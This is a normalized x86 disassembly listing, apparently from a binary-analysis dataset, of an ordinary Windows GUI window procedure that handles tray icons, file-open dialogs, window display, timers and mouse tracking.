xor esi esi
lea esp [ esp ]
jmp r-xdata
mov edx [ rw-data ]
mov ebp [ GetWindowLongA@IAT ]
push 0xffffffeb
push edx
call ebp
xor esi esi
xor edi edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0xac4 ] 0x10
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] esi
mov bl 0x11
mov ecx rw-data
mov [ esp + 0xac4 ] bl
call sub_42c3a0
test eax eax
jle r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
call sub_41cbf0
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x60 ]
push ecx
push 0x2
mov [ esp + 0x68 ] 0x58
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] ebp
call [ Shell_NotifyIconA@IAT ]
cmp [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
jmp r-xdata
cmp eax 0x4
lea ecx [ eax + 0x1 ]
jne r-xdata
mov eax [ rw-data ]
push eax
push ebp
push 0x1b
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov [ esi ] 0x0
mov edx [ rw-data ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0xb8 ]
[ edi ]
mov ecx rw-data
mov [ esp + 0xb8 ] 0x4c
mov [ esp + 0xbc ] edx
mov [ esp + 0xc0 ] ebp
mov [ esp + 0xc4 ] r--data
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xd4 ] esi
mov [ esp + 0xd8 ] 0x80000
call sub_4010a0
mov [ esp + 0xe4 ] eax
lea eax [ esp + 0xb8 ]
push eax
mov [ esp + 0xec ] r--data
mov [ esp + 0xf0 ] 0x881200
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test esi esi
mov [ esp + 0x18 ] 0x1
jne r-xdata
test esi esi
je r-xdata
neg edi
mov ecx [ rw-data ]
add edi ecx
add edi eax
cmp [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
push 0x0
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
push 0x5
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov [ rw-data ] eax
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
test eax eax
jle r-xdata
cmp ebx 0x12
jne r-xdata
mov esi [ rw-data ]
mov ecx [ esp + 0x70 ]
imul ecx esi
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx [ esp + 0x6c ]
imul ecx esi
mov [ esp + 0x44 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0xacc ]
mov [ esp + 0x4c ] esi
mov [ esp + 0x48 ] edx
mov esi [ esp + ebx * 4 + 0x44 ]
imul esi ebp
cmp eax 0x10
jne r-xdata
cmp eax 0x12
jne r-xdata
cmp ebx 0x13
fild [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x14 ] edx
jne r-xdata
cmp [ esp + 0xad0 ] ebp
jne r-xdata
mov eax 0x5
test al al
lea ecx [ esp + 0x1c ]
sete al
push ecx
mov [ rw-data ] al
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x1c ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
push ecx
call [ ShowCursor@IAT ]
mov al [ rw-data ]
cmp ebx 0x1e
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xd
je r-xdata
test eax eax
jle r-xdata
cmp eax 0x6
jae r-xdata
cmp edi 0xc
jge r-xdata
mov ecx rw-data
call sub_4010c0
jmp r-xdata
cmp esi 0xc
jge r-xdata
mov ecx rw-data
call sub_4010c0
jmp r-xdata
sub eax ecx
push ebp
push eax
call sub_472de0
add esp 0x8
jmp r-xdata
mov edx eax
sub edx ecx
js r-xdata
cmp esi 0xc
jge r-xdata
mov ecx rw-data
call sub_4010c0
jmp r-xdata
mov ecx rw-data
call sub_4010c0
test eax eax
jbe r-xdata
test esi esi
jge r-xdata
mov ecx [ esp + 0xad4 ]
push ebp
push 0x0
push ecx
call sub_47e8e0
add esp 0xc
jmp r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov ecx [ rw-data ]
push rw-data
push ecx
call [ GetWindowRect@IAT ]
mov edx [ esp + 0xad4 ]
push ebp
push 0x0
push ebp
push edx
push 0x4
call sub_47e330
add esp 0x14
mov ecx [ rw-data ]
mov edx [ rw-data ]
sub ecx edx
je r-xdata
push ebx
call [ MessageBeep@IAT ]
jmp r-xdata
mov ebp [ rw-data ]
cmp ebp ebx
je r-xdata
push 0x0
call [ MessageBeep@IAT ]
jmp r-xdata
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x2c ] 0x0
imul esi esi 0x70
mov eax [ rw-data ]
mov ecx [ eax + esi + 0x18 ]
mov ebx 0x10
cmp ecx ebx
mov [ esp + 0xac4 ] 0x8
jb r-xdata
mov edx [ rw-data ]
mov [ rw-data ] edx
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
call [ SetFocus@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x64 ] ecx
mov [ esp + 0x60 ] ebp
mov edx [ eax + 0x380 ]
shl edx 0x7
mov ecx [ edx + rw-data ]
test ecx ecx
mov [ esp + 0x68 ] ecx
jl r-xdata
mov ecx [ rw-data ]
push ebp
push 0x0
add ecx 0x70
call sub_41f020
dec eax
push eax
mov eax [ esp + 0xae0 ]
push eax
call sub_485220
add esp 0x10
jmp r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
lea ecx [ esp + 0x738 ]
call sub_420e20
mov eax [ rw-data ]
mov esi 0x10
cmp eax esi
mov eax [ rw-data ]
mov [ esp + 0xac4 ] 0xa
jae r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
mov esi [ eax + 0x380 ]
and edx 0x7
cmp edx esi
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add esi 0x9
test eax eax
mov [ rw-data ] ecx
mov [ rw-data ] esi
je r-xdata
jmp r-xdata
push sub_4480e0
push sub_401360
push 0x4
push 0x1c
lea edx [ esp + 0x1f8 ]
push edx
call sub_4b6874
mov [ esp + 0xac4 ] 0xb
xor esi esi
lea edi [ esp + 0x1e8 ]
lea esp [ esp ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add ebp 0xff
test eax eax
mov [ rw-data ] ebp
je r-xdata
jmp r-xdata
mov ecx [ esp + 0xad4 ]
push ebp
push 0x0
push ebp
push ecx
push eax
call sub_47e330
push 0xa6
push 0xa6
call sub_458630
add esp 0x1c
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x3f800000
push 0x6c
push 0x92
mov [ rw-data ] 0x0
call sub_458630
add esp 0x8
jmp r-xdata
push 0x92
push 0x6b
mov [ rw-data ] 0x2
call sub_458630
add esp 0x8
jmp r-xdata
call sub_481410
mov eax [ rw-data ]
xor esi esi
cmp ebx 0x6e
jg r-xdata
mov eax [ rw-data ]
push 0x6
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push 0x9
push edx
call [ ShowWindow@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push 0x3
push ecx
call [ ShowWindow@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x9
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov cl [ rw-data ]
test cl cl
mov ecx [ rw-data ]
mov [ rw-data ] eax
je r-xdata
mov eax 0x2
mov [ rw-data ] eax
jmp r-xdata
mov esi [ esp + 0x3c ]
mov edx [ esp + 0x74 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x3c ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
call sub_451930
mov eax [ rw-data ]
add esp 0x4
cmp eax esi
je r-xdata
mov ecx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push ecx
push 0x1d
call sub_486df0
add esp 0x10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xad4 ]
push eax
push ebp
call sub_487240
add esp 0x8
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
mov edx [ rw-data ]
push edx
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov ecx [ esp + 0xad4 ]
push 0x0
push ebp
push ecx
call sub_47e8e0
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push ebp
push edx
call sub_466930
mov eax [ rw-data ]
add esp 0x24
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
jle r-xdata
mov eax rw-data
mov esi [ rw-data ]
cmp esi 0x10
mov edi [ rw-data ]
mov eax edi
jae r-xdata
cmp ecx 0x1c
je r-xdata
push ebp
call sub_489430
add esp 0x4
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push ebp
lea eax [ esp + 0x2f0 ]
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
jmp r-xdata
mov eax ebp
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ ecx + esi * 4 ]
cmp edx [ eax ]
je r-xdata
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
mov eax [ rw-data ]
or ebp 0xffffffff
test eax eax
mov [ esp + 0xac4 ] 0x13
je r-xdata
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 ]
push 0xffffffeb
push ecx
call ebp
lea edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x48 ]
mov [ esp + 0x18 ] eax
call sub_46bdf0
mov edi [ esp + 0x48 ]
mov ecx [ edi + esi * 4 ]
add ecx 0x28
call sub_4010a0
push eax
lea ecx [ esp + 0x1b4 ]
call sub_4024d0
lea eax [ esp + 0x1b0 ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0xac8 ] 0x12
call sub_407460
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0xac4 ] bl
call sub_4480e0
mov ecx rw-data
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
mov edx [ rw-data ]
mov esi [ ShowWindow@IAT ]
push 0x5
push edx
call esi
mov ecx rw-data
xor edi edi
call sub_42c3a0
test eax eax
jle r-xdata
call sub_43d290
mov edx [ rw-data ]
mov esi [ ShowWindow@IAT ]
push ebp
push edx
call esi
mov ecx rw-data
xor edi edi
call sub_42c3a0
test eax eax
mov ebx [ GetWindowLongA@IAT ]
jle r-xdata
call sub_43d200
mov ecx [ rw-data ]
mov edx [ edi + rw-data ]
mov eax [ edx + esi * 4 ]
push ecx
dec eax
push 0x1
push eax
call sub_48a5f0
add esp 0xc
mov ecx ebp
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
cmp eax 0x5
jne r-xdata
mov ecx 0x6
jmp r-xdata
push esi
call j_sub_4b66ed
add esp 0x4
jmp r-xdata
push esi
lea ecx [ esp + 0x48 ]
call sub_4024d0
lea ecx [ esp + 0x44 ]
push ecx
mov [ esp + 0xac8 ] 0x14
call sub_45dd10
add esp 0x4
test al al
jne r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov edx [ rw-data ]
push 0xffffffeb
push edx
call [ GetWindowLongA@IAT ]
cmp [ eax ] ebp
je r-xdata
test edi edi
je r-xdata
movzx edx [ rw-data ]
mov eax [ rw-data ]
sub edx ecx
add edx eax
lea edi [ edx + esi - 0x1 ]
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
cmp [ rw-data ] ebp
mov [ rw-data ] eax
mov [ rw-data ] edi
push esi
mov eax [ rw-data ]
push eax
call sub_4a8dd0
add esp 0x4
mov [ rw-data ] edi
test al al
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
add eax ecx
add eax esi
mov [ esp + 0x14 ] eax
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov esi eax
add esp 0x4
imul esi ebp
cmp ebx 0x10
je r-xdata
add eax 0x4
cmp ebx 0xf
je r-xdata
mov eax [ esp + 0xacc ]
mov ecx [ esp + 0x18 ]
push ecx
neg esi
push esi
push edi
call sub_47ae00
add esp 0xc
jmp r-xdata
cmp eax 0xf
je r-xdata
fmul [ r--data ]
fdivr [ rw-data ]
fmul [ rw-data ]
fmul [ r--data ]
jmp r-xdata
mov ecx [ esp + 0xad4 ]
push ebp
push 0x0
push ebp
push ecx
push eax
call sub_47e330
push 0xa6
push 0xa6
call sub_458630
add esp 0x1c
jmp r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x28 ]
push edx
mov [ esp + 0x2c ] 0x10
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x34 ] ecx
call [ _TrackMouseEvent@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x2c ]
push edx
mov edx [ esp + 0x34 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push 0x0
push 0x0
push 0x0
push edx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov edx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x34 ]
push eax
push ecx
push edx
call sub_477a80
add esp 0x20
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
inc eax
jmp r-xdata
mov edx [ eax * 4 + rw-data ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x2c ]
push edx
mov edx [ esp + 0x34 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
jmp r-xdata
dec eax
inc eax
jmp r-xdata
lea eax [ edi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax + eax * 2 ]
mov eax [ edx * 4 + rw-data ]
mov eax [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jl r-xdata
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ eax + eax * 2 ]
mov eax [ eax * 4 + rw-data ]
mov eax [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + edx * 2 - 0x1 ]
test ecx ecx
jl r-xdata
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ eax + eax * 2 ]
mov eax [ eax * 4 + rw-data ]
mov eax [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx ]
mov ecx [ rw-data ]
sub ecx edx
inc ecx
js r-xdata
cmp ebp 0xc
jge r-xdata
mov ecx rw-data
call sub_4010c0
jmp r-xdata
push 0x0
push ebp
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebp 0xf
mov [ esp + 0x78 ] ebp
mov [ esp + 0x74 ] ebx
mov [ esp + 0x64 ] 0x0
cmp [ rw-data ] ebx
mov [ esp + 0xac4 ] 0x1
jne r-xdata
cmp [ ebp + 0x380 ] ebx
jne r-xdata
lea ecx [ eax + esi + 0x4 ]
mov ecx [ eax + esi + 0x4 ]
jmp r-xdata
test [ rw-data ] 0x8
je r-xdata
push ebp
push 0x0
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
cmp [ eax + 0x88 ] 0x10
jb r-xdata
cmp [ esi + 0x380 ] ebp
je r-xdata
push eax
lea ecx [ esp + 0x758 ]
call sub_421120
push 0x4
lea ecx [ esp + 0x64 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x6c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov eax rw-data
mov edx esi
shl edx 0x7
mov edx [ edx + rw-data ]
mov [ esp + 0x68 ] edx
cmp [ eax + 0x344 ] 0x10
jb r-xdata
mov eax [ rw-data ]
push sub_45ba40
push 0x7d0
push 0x3
push eax
call [ SetTimer@IAT ]
mov ecx [ rw-data ]
push ecx
mov [ rw-data ] eax
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
call sub_473580
mov edx [ rw-data ]
add esp 0x8
push esi
push edx
call [ ReleaseDC@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push eax
push edx
call [ KillTimer@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x1e8 ]
push edx
push eax
call sub_462f40
add esp 0x8
cmp esi 0xa
jg r-xdata
push esi
call sub_421f40
add esp 0x4
push eax
mov ecx edi
call sub_402510
inc esi
add edi 0x1c
cmp esi 0x4
jl r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ rw-data ]
push sub_45ba40
push 0x1388
push 0x3
push edx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
call sub_473580
mov ecx [ rw-data ]
add esp 0x8
push esi
push ecx
call [ ReleaseDC@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
lea edx [ esp + 0x3f0 ]
push edx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x2
mov ebx [ rw-data ]
jge r-xdata
cmp eax 0x2
mov ebx [ rw-data ]
jge r-xdata
mov edx [ rw-data ]
dec edx
cmp ecx edx
jne r-xdata
test ecx ecx
jne r-xdata
push ebp
push eax
push esi
push ebp
push ebp
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
lea ecx [ esi + ebp ]
cmp ecx ebx
jge r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov esi [ rw-data ]
sub eax edx
mov edx [ esp + 0x74 ]
add edx eax
mov eax [ rw-data ]
sub eax esi
mov esi [ esp + 0x3c ]
add esi eax
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test edx edx
mov eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
sub edx ecx
mov ecx [ esp + 0x3c ]
add ecx edx
sub eax [ rw-data ]
mov edx [ esp + 0x74 ]
add edx eax
mov [ esp + 0x3c ] ecx
mov [ esp + 0x74 ] edx
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_4010f0
test eax eax
jbe r-xdata
push ebp
push 0x0
push 0xffffffff
push esi
call sub_485220
add esp 0x10
jmp r-xdata
cmp edi ebp
mov [ rw-data ] 0x2
jne r-xdata
mov [ rw-data ] ebp
jmp r-xdata
cmp esi 0x10
mov ecx edi
jae r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
jle r-xdata
mov eax rw-data
cmp ecx esi
je r-xdata
call sub_46fe50
call sub_452ff0
call sub_43fec0
call sub_405030
mov esi [ esp + 0xad4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
push r--data
push esi
call [ SetWindowTextA@IAT ]
lea ecx [ esp + 0x28 ]
call sub_462cf0
jmp r-xdata
mov eax [ edi + esi * 4 ]
push eax
call ebx
inc esi
jmp r-xdata
cmp esi eax
jge r-xdata
mov ecx rw-data
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
push eax
lea ecx [ esp + 0x2c ]
call sub_453720
mov edi [ esp + 0x2c ]
mov eax [ rw-data ]
test eax eax
mov ebx [ rw-data ]
lea ecx [ esp + 0x60 ]
je r-xdata
mov ecx [ rw-data ]
push ecx
lea ecx [ eax + 0xfc ]
call sub_421150
mov edx [ rw-data ]
mov ebp [ edx + 0x380 ]
mov al [ rw-data ]
test al al
sete al
mov [ rw-data ] al
jmp r-xdata
mov ebx [ GetWindowLongA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x10c
push 0xfffffffa
push eax
mov [ esp + 0x6c ] 0x58
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] ebp
mov [ esp + 0x78 ] 0x7
mov [ esp + 0x7c ] 0x1420
call ebx
push eax
call [ LoadIconA@IAT ]
mov ecx [ rw-data ]
mov [ esp + 0x74 ] eax
push 0x40
lea eax [ esp + 0x7c ]
push eax
push ecx
call [ GetWindowTextA@IAT ]
lea edx [ esp + 0x60 ]
push edx
push ebp
call [ Shell_NotifyIconA@IAT ]
mov al [ rw-data ]
test al al
sete al
mov [ rw-data ] al
jmp r-xdata
lea esp [ esp ]
jmp r-xdata
push 0x0
add ecx 0x9ca4
push ecx
mov ecx [ rw-data ]
push 0x111
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
xor ecx ecx
movzx esi [ esp + 0xf0 ]
add esi [ esp + 0x14 ]
lea ecx [ esp + 0x140 ]
call sub_401510
mov bl 0x15
mov ecx rw-data
mov [ esp + 0xac4 ] bl
call sub_4010f0
mov [ esp + 0x18 ] eax
cmp [ esi ] 0x0
je r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x4c ]
call sub_4017f0
test ebx ebx
je r-xdata
cmp ebx 0xa
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push ebp
call sub_487240
add esp 0x8
jmp r-xdata
push 0x2
call sub_487240
add esp 0x8
jmp r-xdata
push esi
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
mov [ esp + 0x14 ] eax
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi eax
add esp 0x4
imul edi ebp
cmp ebx 0xf
cmp ebx 0x11
jne r-xdata
mov edi [ rw-data ]
mov ecx [ esp + 0x38 ]
imul ecx edi
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx [ esp + 0x34 ]
imul ecx edi
mov [ esp + 0x44 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0xacc ]
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] edx
mov edi [ esp + ebx * 4 + 0x44 ]
imul edi ebp
cmp eax 0xf
jmp r-xdata
cmp eax 0x11
jne r-xdata
mov ecx [ rw-data ]
fstp [ rw-data ]
lea eax [ esp + 0x28 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edi [ esp + 0x2c ]
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x14 ]
sub eax edi
mov edi [ esp + 0x28 ]
push edx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ esp + 0x38 ]
sub eax edi
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ esp + 0xae0 ]
push ebp
push 0x0
push eax
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push ebp
push 0x0
push ecx
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x2c ]
push eax
mov eax [ esp + 0x34 ]
push edx
push eax
push ecx
call sub_477a80
add esp 0x20
dec eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp ecx eax
jge r-xdata
jmp r-xdata
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax + eax * 2 ]
mov eax [ edx * 4 + rw-data ]
mov eax [ rw-data ]
jmp r-xdata
lea ecx [ edi + esi ]
cmp ecx eax
jl r-xdata
push 0x3f5
push eax
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
mov esi [ rw-data ]
push 0x4
sub esi eax
push esi
push ecx
push eax
mov eax [ rw-data ]
push edx
push 0x0
push eax
mov [ rw-data ] 0x3f800000
mov [ rw-data ] ebp
mov [ rw-data ] 0x2
mov [ rw-data ] 0x0
call [ SetWindowPos@IAT ]
jmp r-xdata
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x6c ]
call sub_401dd0
mov esi [ rw-data ]
cmp esi 0x10
mov edi [ rw-data ]
mov eax edi
jae r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
lea edi [ eax + esi + 0x4 ]
mov edi [ eax + esi + 0x4 ]
jmp r-xdata
cmp [ eax + esi + 0x18 ] ebx
jb r-xdata
and [ rw-data ] esi
jmp r-xdata
add eax 0x74
mov eax [ eax + 0x74 ]
jmp r-xdata
mov edi [ rw-data ]
test edi edi
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x64 ]
push edx
lea ecx [ esp + 0x954 ]
call sub_401e80
cmp [ rw-data ] esi
mov eax [ rw-data ]
jae r-xdata
add eax 0x330
mov eax [ eax + 0x330 ]
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x1c ] ecx
call sub_404310
mov edx [ rw-data ]
push rw-data
push edx
mov [ esp + 0xacc ] 0xd
call sub_462f40
add esp 0x8
push rw-data
lea eax [ esp + 0x638 ]
push eax
call [ lstrcpyA@IAT ]
push rw-data
lea ecx [ esp + 0x64 ]
call sub_401fc0
mov edx [ rw-data ]
mov bl [ rw-data ]
xor ebp ebp
push ebp
lea ecx [ esp + 0x3f4 ]
push ecx
push edx
mov [ esp + 0xad0 ] 0xe
call sub_47b1d0
mov eax [ rw-data ]
add esp 0xc
cmp eax ebp
mov [ rw-data ] bl
jle r-xdata
push 0x384
call sub_4b573e
add esp 0x4
mov [ esp + 0x1c ] eax
test eax eax
mov [ esp + 0xac4 ] 0xc
je r-xdata
mov ecx [ esp + 0xabc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xab8
retn
mov [ esp + 0x14 ] 0x5
mov ebx [ rw-data ]
mov [ esp + 0x14 ] 0x4
jmp r-xdata
mov ebx [ rw-data ]
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push ebp
push ecx
push esi
push 0xffffffff
push 0xffffffff
call sub_4719b0
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ edx + edi ]
cmp eax [ esp + 0x6c ]
mov eax [ rw-data ]
jge r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x0
jne r-xdata
cmp eax 0x1
jne r-xdata
test ecx ecx
mov eax [ rw-data ]
je r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
push ecx
lea eax [ esp + 0x2f4 ]
push eax
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0x2ec ]
push ecx
call sub_464fe0
add esp 0x4
jmp r-xdata
mov ecx rw-data
cmp esi 0x10
mov ecx edi
jae r-xdata
cmp edx 0x1c
je r-xdata
mov edx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ebp [ esp + 0x30 ]
push rw-data
push rw-data
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx rw-data
inc edi
call sub_42c3a0
cmp edi eax
jl r-xdata
push ebp
push eax
call esi
mov ecx [ rw-data ]
mov edx [ ecx + edi * 4 ]
push 0xffffffeb
push edx
call ebx
cmp eax ebp
je r-xdata
mov ecx rw-data
call sub_4010f0
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov edi [ FindFirstFileA@IAT ]
mov ecx [ rw-data ]
push ecx
push 0xffffffff
push 0x49
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0xffffffff
push 0x4a
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp ebx 0xb
jne r-xdata
mov [ esp + 0x14 ] 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push esi
push edi
